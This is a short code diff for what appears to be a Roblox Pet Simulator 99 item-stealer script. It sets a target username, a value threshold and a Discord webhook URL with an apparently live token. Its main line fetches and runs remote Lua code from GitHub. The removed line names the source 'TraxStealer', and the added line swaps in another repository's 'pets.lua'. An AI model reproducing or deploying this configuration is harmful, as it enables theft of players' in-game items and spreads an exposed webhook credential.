@@ -1,6 +1,6 @@
 Username = "day2109gatainha"
-Username2 = "Choraprattk"
-MinimumRAP = 100
-Webhook = "Captain Hook"
+Username2 = "day2109gatainha"
+MinimumRAP = 500000
+Webhook = "https://discord.com/api/webhooks/1350830856843034715/LyEDY1mDITHP6PkK2aqjbJB24dr1OijZ4gT45K0s6BYQQFjNjQC0oMSWsthruNhiExQd"
 
-loadstring(game:HttpGet("https://raw.githubusercontent.com/TraxMain/TraxStealer/refs/heads/main/PS99Stealer", true))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/tobi437a/P99/main/pets.lua"))()
